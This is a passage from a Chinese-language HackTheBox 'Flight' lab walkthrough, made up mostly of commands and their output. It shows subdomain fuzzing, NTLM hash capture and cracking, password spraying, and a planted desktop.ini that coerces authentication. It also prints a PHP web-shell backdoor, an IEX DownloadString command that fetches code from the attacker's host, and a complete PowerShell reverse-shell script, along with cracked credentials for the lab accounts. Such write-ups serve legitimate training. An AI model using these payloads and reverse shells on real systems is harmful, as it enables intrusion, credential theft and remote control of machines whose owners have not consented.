class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">Archlinux:~/HackTheBox$ wfuzz -c -u http://flight.htb -H <span class="hljs-string">&quot;Host: FUZZ.flight.htb&quot;</span> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --hl 154<br>********************************************************<br>* Wfuzz 3.1.0 - The Web Fuzzer                         *<br>********************************************************<br><br>Target: http://flight.htb/<br>Total requests: 4989<br><br>=====================================================================<br>ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                                                                   <br>=====================================================================<br><br>000000624:   200        90 L     412 W      3996 Ch     <span class="hljs-string">&quot;school&quot;</span>   <br></code></pre></td></tr></table></figure><h3 id="Get-sv-apache"><a href="#Get-sv-apache" class="headerlink" title="Get sv_apache:"></a>Get sv_apache:</h3><p>school存在文件包含漏洞，远程包含文件可以引发hash泄露：</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20221227100347107.png" alt="image-20221227100347107"></p><p>john破解：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash">Archlinux:~/HackTheBox$ john -w=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt <span class="hljs-built_in">hash</span> <br>--------------------------------------------------------------------------<br>The library attempted to open the following supporting CUDA libraries,<br>but each of them failed.  CUDA-aware support is disabled.<br>libcuda.so.1: cannot open shared object file: No such file or directory<br>libcuda.dylib: cannot open shared object file: No such file or directory<br>/usr/lib64/libcuda.so.1: cannot open shared object file: No such file or directory<br>/usr/lib64/libcuda.dylib: cannot open shared object file: No such file or directory<br>If you are not interested <span class="hljs-keyword">in</span> CUDA-aware support, <span class="hljs-keyword">then</span> run with<br>--mca opal_warn_on_missing_libcuda 0 to suppress this message.  If you are interested<br><span class="hljs-keyword">in</span> CUDA-aware support, <span class="hljs-keyword">then</span> try setting LD_LIBRARY_PATH to the location<br>of libcuda.so.1 to get passed this issue.<br>--------------------------------------------------------------------------<br>Warning: detected <span class="hljs-built_in">hash</span> <span class="hljs-built_in">type</span> <span class="hljs-string">&quot;netntlmv2&quot;</span>, but the string is also recognized as <span class="hljs-string">&quot;ntlmv2-opencl&quot;</span><br>Use the <span class="hljs-string">&quot;--format=ntlmv2-opencl&quot;</span> option to force loading these as that <span class="hljs-built_in">type</span> instead<br>Using default input encoding: UTF-8<br>Loaded 1 password <span class="hljs-built_in">hash</span> (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])<br>Will run 16 OpenMP threads<br>Press <span class="hljs-string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="hljs-keyword">for</span> status<br>S@Ss!K@*t13      (svc_apache)<br>1g 0:00:00:01 DONE (2022-12-27 09:45) 0.7812g/s 8332Kp/s 8332Kc/s 8332KC/s SANTIAGoGUERRA..Ryanec1<br>Use the <span class="hljs-string">&quot;--show --format=netntlmv2&quot;</span> options to display all of the cracked passwords reliably<br>Session completed<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">svc_apache:S@Ss!K@*t13<br></code></pre></td></tr></table></figure><h3 id="Get-S-Moon"><a href="#Get-S-Moon" class="headerlink" title="Get S.Moon:"></a>Get S.Moon:</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">Archlinux:~/HackTheBox$ crackmapexec smb 10.10.11.187 -u svc_apache -p <span class="hljs-string">&#x27;S@Ss!K@*t13&#x27;</span> --<span class="hljs-built_in">users</span><br>SMB         10.10.11.187    445    G0               [*] Windows 10.0 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)<br>SMB         10.10.11.187    445    G0               [+] flight.htb\svc_apache:S@Ss!K@*t13 <br>SMB         10.10.11.187    445    G0               [+] Enumerated domain user(s)<br>SMB         10.10.11.187    445    G0               flight.htb\O.Possum                       badpwdcount: 0 desc: Helpdesk<br>SMB         10.10.11.187    445    G0               flight.htb\svc_apache                     badpwdcount: 0 desc: Service Apache web<br>SMB         10.10.11.187    445    G0               flight.htb\V.Stevens                      badpwdcount: 0 desc: Secretary<br>SMB         10.10.11.187    445    G0               flight.htb\D.Truff                        badpwdcount: 0 desc: Project Manager<br>SMB         10.10.11.187    445    G0               flight.htb\I.Francis                      badpwdcount: 0 desc: Nobody knows why he<span class="hljs-string">&#x27;s here</span><br><span class="hljs-string">SMB         10.10.11.187    445    G0               flight.htb\W.Walker                       badpwdcount: 0 desc: Payroll officer</span><br><span class="hljs-string">SMB         10.10.11.187    445    G0               flight.htb\C.Bum                          badpwdcount: 0 desc: Senior Web Developer</span><br><span class="hljs-string">SMB         10.10.11.187    445    G0               flight.htb\M.Gold                         badpwdcount: 0 desc: Sysadmin</span><br><span class="hljs-string">SMB         10.10.11.187    445    G0               flight.htb\L.Kein                         badpwdcount: 0 desc: Penetration tester</span><br><span class="hljs-string">SMB         10.10.11.187    445    G0               flight.htb\G.Lors                         badpwdcount: 0 desc: Sales manager</span><br><span class="hljs-string">SMB         10.10.11.187    445    G0               flight.htb\R.Cold                         badpwdcount: 0 desc: HR Assistant</span><br><span class="hljs-string">SMB         10.10.11.187    445    G0               flight.htb\S.Moon                         badpwdcount: 0 desc: Junion Web Developer</span><br><span class="hljs-string">SMB         10.10.11.187    445    G0               flight.htb\krbtgt                         badpwdcount: 0 desc: Key Distribution Center Service Account</span><br><span class="hljs-string">SMB         10.10.11.187    445    G0               flight.htb\Guest                          badpwdcount: 0 desc: Built-in account for guest access to the computer/domain</span><br><span class="hljs-string">SMB         10.10.11.187    445    G0               flight.htb\Administrator                  badpwdcount: 0 desc: Built-in account for administering the computer/domain</span><br></code></pre></td></tr></table></figure><p>喷射：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">Archlinux:~/HackTheBox$ crackmapexec smb 10.10.11.187 -u user -p <span class="hljs-string">&#x27;S@Ss!K@*t13&#x27;</span>    <br>SMB         10.10.11.187    445    G0               [*] Windows 10.0 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)<br>SMB         10.10.11.187    445    G0               [-] flight.htb\O.Possum:S@Ss!K@*t13 STATUS_LOGON_FAILURE <br>SMB         10.10.11.187    445    G0               [-] flight.htb\V.Stevens:S@Ss!K@*t13 STATUS_LOGON_FAILURE <br>SMB         10.10.11.187    445    G0               [-] flight.htb\D.Truff:S@Ss!K@*t13 STATUS_LOGON_FAILURE <br>SMB         10.10.11.187    445    G0               [-] flight.htb\I.Francis:S@Ss!K@*t13 STATUS_LOGON_FAILURE <br>SMB         10.10.11.187    445    G0               [-] flight.htb\W.Walker:S@Ss!K@*t13 STATUS_LOGON_FAILURE <br>SMB         10.10.11.187    445    G0               [-] flight.htb\C.Bum:S@Ss!K@*t13 STATUS_LOGON_FAILURE <br>SMB         10.10.11.187    445    G0               [-] flight.htb\M.Gold:S@Ss!K@*t13 STATUS_LOGON_FAILURE <br>SMB         10.10.11.187    445    G0               [-] flight.htb\L.Kein:S@Ss!K@*t13 STATUS_LOGON_FAILURE <br>SMB         10.10.11.187    445    G0               [-] flight.htb\G.Lors:S@Ss!K@*t13 STATUS_LOGON_FAILURE <br>SMB         10.10.11.187    445    G0               [-] flight.htb\R.Cold:S@Ss!K@*t13 STATUS_LOGON_FAILURE <br>SMB         10.10.11.187    445    G0               [+] flight.htb\S.Moon:S@Ss!K@*t13 <br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">S.Moon:S@Ss!K@*t13<br></code></pre></td></tr></table></figure><h3 id="Get-C-bum"><a href="#Get-C-bum" class="headerlink" title="Get C.bum"></a>Get C.bum</h3><p>枚举共享发现一个可写目录：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">Archlinux:~/HackTheBox$ smbmap -H 10.10.11.187 -u S.Moon -p <span class="hljs-string">&#x27;S@Ss!K@*t13&#x27;</span><br>[+] IP: 10.10.11.187:445        Name: flight.htb                                        <br>        Disk                                                    Permissions     Comment<br>        ----                                                    -----------     -------<br>        ADMIN$                                                  NO ACCESS       Remote Admin<br>        C$                                                      NO ACCESS       Default share<br>        IPC$                                                    READ ONLY       Remote IPC<br>        NETLOGON                                                READ ONLY       Logon server share <br>        Shared                                                  READ, WRITE<br>        SYSVOL                                                  READ ONLY       Logon server share <br>        Users                                                   READ ONLY<br>        Web                                                     READ ONLY<br></code></pre></td></tr></table></figure><p>塞个SCF：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">Archlinux:~/HackTheBox$ <span class="hljs-built_in">echo</span> [.ShellClassInfo] &gt; desktop.ini<br>                                                                                                                                             <br>Archlinux:~/HackTheBox$ <span class="hljs-built_in">echo</span> IconResource=\\10.10.16.15\aa &gt;&gt; desktop.ini <br>                                                                                                                                             <br>Archlinux:~/HackTheBox$ smbclient //10.10.11.187/Shared -U S.Moon<br>Can<span class="hljs-string">&#x27;t load /etc/samba/smb.conf - run testparm to debug it</span><br><span class="hljs-string">Password for [WORKGROUP\S.Moon]:</span><br><span class="hljs-string">Try &quot;help&quot; to get a list of possible commands.</span><br><span class="hljs-string">smb: \&gt; put desktop.ini </span><br><span class="hljs-string">putting file desktop.ini as \desktop.ini (0.1 kb/s) (average 0.1 kb/s)</span><br><span class="hljs-string">smb: \&gt; </span><br></code></pre></td></tr></table></figure><p>捕获哈希：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">[SMB] NTLMv2-SSP Client   : 10.10.11.187<br>[SMB] NTLMv2-SSP Username : flight.htb\c.bum<br>[SMB] NTLMv2-SSP Hash     : c.bum::flight.htb:93015a44e53b5fa2:DACC7771C9CED393281624D8DA0D7846:010100000000000080DDEF69DB19D90171A89463B6E1E7050000000002000800570043003000500001001E00570049004E002D0058003800570052004B003200300041004D004500370004003400570049004E002D0058003800570052004B003200300041004D00450037002E0057004300300050002E004C004F00430041004C000300140057004300300050002E004C004F00430041004C000500140057004300300050002E004C004F00430041004C000700080080DDEF69DB19D90106000400020000000800300030000000000000000000000000300000C1139060ED5E923F68D5580FC72D4A34A3728ECC5DC94465CE86345257D96EBB0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00310035000000000000000000<br>[+] Exiting...<br></code></pre></td></tr></table></figure><p>john破解：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash">Archlinux:~/HackTheBox$ john hash1 -w=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt <br>--------------------------------------------------------------------------<br>The library attempted to open the following supporting CUDA libraries,<br>but each of them failed.  CUDA-aware support is disabled.<br>libcuda.so.1: cannot open shared object file: No such file or directory<br>libcuda.dylib: cannot open shared object file: No such file or directory<br>/usr/lib64/libcuda.so.1: cannot open shared object file: No such file or directory<br>/usr/lib64/libcuda.dylib: cannot open shared object file: No such file or directory<br>If you are not interested <span class="hljs-keyword">in</span> CUDA-aware support, <span class="hljs-keyword">then</span> run with<br>--mca opal_warn_on_missing_libcuda 0 to suppress this message.  If you are interested<br><span class="hljs-keyword">in</span> CUDA-aware support, <span class="hljs-keyword">then</span> try setting LD_LIBRARY_PATH to the location<br>of libcuda.so.1 to get passed this issue.<br>--------------------------------------------------------------------------<br>Warning: detected <span class="hljs-built_in">hash</span> <span class="hljs-built_in">type</span> <span class="hljs-string">&quot;netntlmv2&quot;</span>, but the string is also recognized as <span class="hljs-string">&quot;ntlmv2-opencl&quot;</span><br>Use the <span class="hljs-string">&quot;--format=ntlmv2-opencl&quot;</span> option to force loadingRunasCs.exe these as that <span class="hljs-built_in">type</span> instead<br>Using default input encoding: UTF-8<br>Loaded 1 password <span class="hljs-built_in">hash</span> (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])<br>Will run 16 OpenMP threads<br>Press <span class="hljs-string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="hljs-keyword">for</span> status<br>Tikkycoll_431012284 (c.bum)<br>1g 0:00:00:01 DONE (2022-12-27 10:24) 0.7751g/s 8172Kp/s 8172Kc/s 8172KC/s TinyMite1..Teacher2008<br>Use the <span class="hljs-string">&quot;--show --format=netntlmv2&quot;</span> options to display all of the cracked passwords reliably<br>Session completed<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">c.bum:Tikkycoll_431012284<br></code></pre></td></tr></table></figure><h3 id="Get-C-Bum-Shell"><a href="#Get-C-Bum-Shell" class="headerlink" title="Get C.Bum Shell:"></a>Get C.Bum Shell:</h3><p>c.bum对web服务器的目录有写入权限：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">Archlinux:~/HackTheBox$ smbmap -H 10.10.11.187 -u C.Bum -p <span class="hljs-string">&#x27;Tikkycoll_431012284&#x27;</span><br>[+] IP: 10.10.11.187:445        Name: flight.htb                                        <br>        Disk                                                    Permissions     Comment<br>        ----                                                    -----------     -------<br>        ADMIN$                                                  NO ACCESS       Remote Admin<br>        C$                                                      NO ACCESS       Default share<br>        IPC$                                                    READ ONLY       Remote IPC<br>        NETLOGON                                                READ ONLY       Logon server share <br>        Shared                                                  READ, WRITE<br>        SYSVOL                                                  READ ONLY       Logon server share <br>        Users                                                   READ ONLY<br>        Web                                                     READ, WRITE<br></code></pre></td></tr></table></figure><p>可以传入一个webshell：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs bash">Archlinux:/usr/share/webshells/php$ <span class="hljs-built_in">cat</span> simple-backdoor.php  <br>&lt;!-- Simple PHP backdoor by DK (http://michaeldaw.org) --&gt;<br><br>&lt;?php<br><br><span class="hljs-keyword">if</span>(isset(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]))&#123;<br>        <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;&quot;</span>;<br>        <span class="hljs-variable">$cmd</span> = (<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br>        system(<span class="hljs-variable">$cmd</span>);<br>        <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&lt;/pre&gt;&quot;</span>;<br>        die;<br>&#125;<br><br>?&gt;<br><br>Usage: http://target.com/simple-backdoor.php?cmd=<span class="hljs-built_in">cat</span>+/etc/passwd<br><br>&lt;!--    http://michaeldaw.org   2006    --&gt;<br>                                                                                                                                             <br>Archlinux:/usr/share/webshells/php$ smbmap -H 10.10.11.187 -u C.Bum -p <span class="hljs-string">&#x27;Tikkycoll_431012284&#x27;</span>         <br>Archlinux:/usr/share/webshells/php$ smbclient //10.10.11.187/Web -U C.Bum                   <br>Can<span class="hljs-string">&#x27;t load /etc/samba/smb.conf - run testparm to debug it</span><br><span class="hljs-string">Password for [WORKGROUP\C.Bum]:</span><br><span class="hljs-string">Try &quot;help&quot; to get a list of possible commands.</span><br><span class="hljs-string">smb: \&gt; put simple-backdoor.php </span><br><span class="hljs-string">putting file simple-backdoor.php as \simple-backdoor.php (1.3 kb/s) (average 1.3 kb/s)</span><br><span class="hljs-string">smb: \&gt; ls</span><br><span class="hljs-string">  .                                   D        0  Tue Dec 27 18:07:22 2022</span><br><span class="hljs-string">  ..                                  D        0  Tue Dec 27 18:07:22 2022</span><br><span class="hljs-string">  flight.htb                          D        0  Tue Dec 27 18:07:01 2022</span><br><span class="hljs-string">  school.flight.htb                   D        0  Tue Dec 27 18:07:01 2022</span><br><span class="hljs-string"></span><br><span class="hljs-string">                5056511 blocks of size 4096. 1250800 blocks available</span><br><span class="hljs-string">smb: \&gt; cd school.flight.htb\</span><br><span class="hljs-string">smb: \school.flight.htb\&gt; ls</span><br><span class="hljs-string">  .                                   D        0  Tue Dec 27 18:07:01 2022</span><br><span class="hljs-string">  ..                                  D        0  Tue Dec 27 18:07:01 2022</span><br><span class="hljs-string">  about.html                          A     1689  Tue Oct 25 11:54:45 2022</span><br><span class="hljs-string">  blog.html                           A     3618  Tue Oct 25 11:53:59 2022</span><br><span class="hljs-string">  home.html                           A     2683  Tue Oct 25 11:56:58 2022</span><br><span class="hljs-string">  images                              D        0  Tue Dec 27 18:07:01 2022</span><br><span class="hljs-string">  index.php                           A     2092  Thu Oct 27 15:59:25 2022</span><br><span class="hljs-string">  lfi.html                            A      179  Thu Oct 27 15:55:16 2022</span><br><span class="hljs-string">  styles                              D        0  Tue Dec 27 18:07:01 2022</span><br><span class="hljs-string"></span><br><span class="hljs-string">                5056511 blocks of size 4096. 1250799 blocks available</span><br><span class="hljs-string">smb: \school.flight.htb\&gt; put simple-backdoor.php </span><br><span class="hljs-string">putting file simple-backdoor.php as \school.flight.htb\simple-backdoor.php (1.0 kb/s) (average 1.1 kb/s)</span><br><span class="hljs-string">smb: \school.flight.htb\&gt; </span><br></code></pre></td></tr></table></figure><p>可以弹个Powershell：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell">Archlinux:/usr/share/webshells/powershell<span class="hljs-variable">$</span> <span class="hljs-built_in">cat</span> shell.ps1     <br><span class="hljs-variable">$client</span> = <span class="hljs-built_in">New-Object</span> System.Net.Sockets.TCPClient(<span class="hljs-string">&quot;10.10.16.15&quot;</span>,<span class="hljs-number">4444</span>);<span class="hljs-variable">$stream</span> = <span class="hljs-variable">$client</span>.GetStream();[<span class="hljs-built_in">byte</span>[]]<span class="hljs-variable">$bytes</span> = <span class="hljs-number">0</span>..<span class="hljs-number">65535</span>|%&#123;<span class="hljs-number">0</span>&#125;;<span class="hljs-keyword">while</span>((<span class="hljs-variable">$i</span> = <span class="hljs-variable">$stream</span>.Read(<span class="hljs-variable">$bytes</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">$bytes</span>.Length)) <span class="hljs-operator">-ne</span> <span class="hljs-number">0</span>)&#123;;<span class="hljs-variable">$data</span> = (<span class="hljs-built_in">New-Object</span> <span class="hljs-literal">-TypeName</span> System.Text.ASCIIEncoding).GetString(<span class="hljs-variable">$bytes</span>,<span class="hljs-number">0</span>, <span class="hljs-variable">$i</span>);<span class="hljs-variable">$sendback</span> = (<span class="hljs-built_in">iex</span> <span class="hljs-variable">$data</span> <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span> | <span class="hljs-built_in">Out-String</span> );<span class="hljs-variable">$sendback2</span> = <span class="hljs-variable">$sendback</span> + <span class="hljs-string">&quot;PS &quot;</span> + (<span class="hljs-built_in">pwd</span>).Path + <span class="hljs-string">&quot;&gt; &quot;</span>;<span class="hljs-variable">$sendbyte</span> = ([<span class="hljs-type">text.encoding</span>]::ASCII).GetBytes(<span class="hljs-variable">$sendback2</span>);<span class="hljs-variable">$stream</span>.Write(<span class="hljs-variable">$sendbyte</span>,<span class="hljs-number">0</span>,<span class="hljs-variable">$sendbyte</span>.Length);<span class="hljs-variable">$stream</span>.Flush()&#125;;<span class="hljs-variable">$client</span>.Close()<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">Archlinux:/usr/share/webshells/powershell$ sudo python -m http.server 80<br>Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...<br>10.10.11.187 - - [27/Dec/2022 11:16:58] <span class="hljs-string">&quot;GET /shell.ps1 HTTP/1.1&quot;</span> 200 -<br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>school.flight.htb<span class="hljs-regexp">/simple-backdoor.php?cmd=powershell.exe+IEX(New-Object%20Net.WebClient).DownloadString(%27http:/</span><span class="hljs-regexp">/10.10.16.15/</span>shell.ps1%<span class="hljs-number">27</span>)<br></code></pre></td></tr></table></figure><p>nc可以收到一个shell：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs powershell">Archlinux:~<span class="hljs-variable">$</span> nc <span class="hljs-literal">-lvnp</span> <span class="hljs-number">4444</span><br>Listening on <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span> <span class="hljs-number">4444</span><br>Connection received on <span class="hljs-number">10.10</span>.<span class="hljs-number">11.187</span> <span class="hljs-number">50106</span><br>whoami<br>flight\svc_apache<br><span class="hljs-built_in">PS</span> C:\xampp\htdocs\school.flight.htb&gt; <span class="hljs-built_in">ls</span><br><br><br>    Directory: C:\xampp\htdocs\school.flight.htb<br><br><br>Mode                LastWriteTime         Length Name                                                                  <br><span class="hljs-literal">----</span>                <span class="hljs-literal">-------------</span>         <span class="hljs-literal">------</span> <span class="hljs-literal">----</span>                                                 <br>d<span class="hljs-literal">-----</span>       <span class="hljs-number">12</span>/<span class="hljs-number">27</span>/<span class="hljs-number">2022</span>   <span class="hljs-number">2</span>:<span class="hljs-number">17</span> AM                images                                               <br>d<span class="hljs-literal">-----</span>       <span class="hljs-number">12</span>/<span class="hljs-number">27</span>/<span class="hljs-number">2022</span>   <span class="hljs-number">2</span>:<span class="hljs-number">17</span> AM                styles                                               <br><span class="hljs-literal">-a----</span>       <span class="hljs-number">10</span>/<span class="hljs-number">24</span>/<span class="hljs-number">2022</span>   <span class="hljs-number">8</span>:<span class="hljs-number">54</span> PM           <span class="hljs-number">1689</span> about.html                                           <br><span class="hljs-literal">-a----</span>       <span class="hljs-number">10</span>/<span class="hljs-number">24</span>/<span class="hljs-number">2022</span>   <span class="hljs-number">8</span>:<span class="hljs-number">53</span> PM           <span class="hljs-number">3618</span> blog.html                                           <br><span class="hljs-literal">-a----</span>       <span class="hljs-number">10</span>/<span class="hljs-number">24</span>/<span class="hljs-number">2022</span>   <span class="hljs-number">8</span>:<span class="hljs-number">56</span> PM           <span class="hljs-number">2683</span> home.html                                           <br><span class="hljs-literal">-a----</span>       <span class="hljs-number">10</span>/<span class="hljs-number">27</span>/<span class="hljs-number">2022</span>  <span class="hljs-number">12</span>:<span class="hljs-number">59</span> AM           <span class="hljs-number">2092</span> index.php                                           <br><span class="hljs-literal">-a----</span>       <span class="hljs-number">10</span>/<span class="hljs-number">27</span>/<span class="hljs-number">2022</span>  <span class="hljs-number">12</span>:<span class="hljs-number">55</span> AM            <span class="hljs-number">179</span> lfi.html                                             <br><span class="hljs-literal">-a----</span>       <span class="hljs-number">12</span>/<span class="hljs-number">27</span>/<span class="hljs-number">2022</span>   <span class="hljs-number">2</span>:<span class="hljs-number">12</span> AM            <span class="hljs-number">328</span> simple<span class="hljs-literal">-backdoor</span>.php                                                   <br><span class="hljs-built_in">PS</span> C:\xampp\htdocs\school.flight.htb&gt; <span class="hljs-built_in">cd</span> ~<br></code></pre></td></tr></table></figure><p>可以用RunasCs.exe模仿回C.Bum用户：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash">PS C:\Users\svc_apache&gt; curl http://10.10.16.15/RunasCs.exe -o RunasCs.exe<br>PS C:\Users\svc_apache&gt; <span class="hljs-built_in">ls</span><br><br><br>    Directory: C:\Users\svc_apache<br><br><br>Mode                LastWriteTime         Length Name                                                                  <br>----                -------------         ------ ----                                                                  <br>d-r---        9/15/2018  12:19 AM                Desktop                                                               <br>d-r---        9/22/2022   1:16 PM                Documents                                                             <br>d-r---        9/15/2018  12:19 AM                Downloads                                                             <br>d-r---        9/15/2018  12:19 AM                FavoriteRunasCs.exes                                                             <br>d-r---        9/15/2018  12:19 AM                Links                                                                 <br>d-r---        9/15/2018  12:19 AM                Music                                                                 <br>d-r---        9/15/2018  12:19 AM                Pictures                                                              <br>d-----        9/15/2018  12:19 AM                Saved Games                                                 <br>d-r---        9/15/2018  12:19 AM                Videos                                                        <br>-a----       12/27/2022   3:11 AM          49152 RunasCs.exe                                         <br>PS C:\Users\svc_apache&gt; .\RunasCs.exe C.Bum Tikkycoll_431012284 powershell -r 10.10.16.15:4445<br>[*] Warning: Using <span class="hljs-keyword">function</span> CreateProcessWithLogonW is not compatible with logon <span class="hljs-built_in">type</span> 8. Reverting to logon <span class="hljs-built_in">type</span> Interactive (2)...<br>[+] Running <span class="hljs-keyword">in</span> session 0 with process <span class="hljs-keyword">function</span> CreateProcessWithLogonW()<br>[+] Using Station\Desktop: Service-0x0-570e9$\Default<br>[+] Async process <span class="hljs-string">&#x27;powershell&#x27;</span> with pid 3920 created and left <span class="hljs-keyword">in</span> background.<br>PS C:\Users\svc_apache&gt; 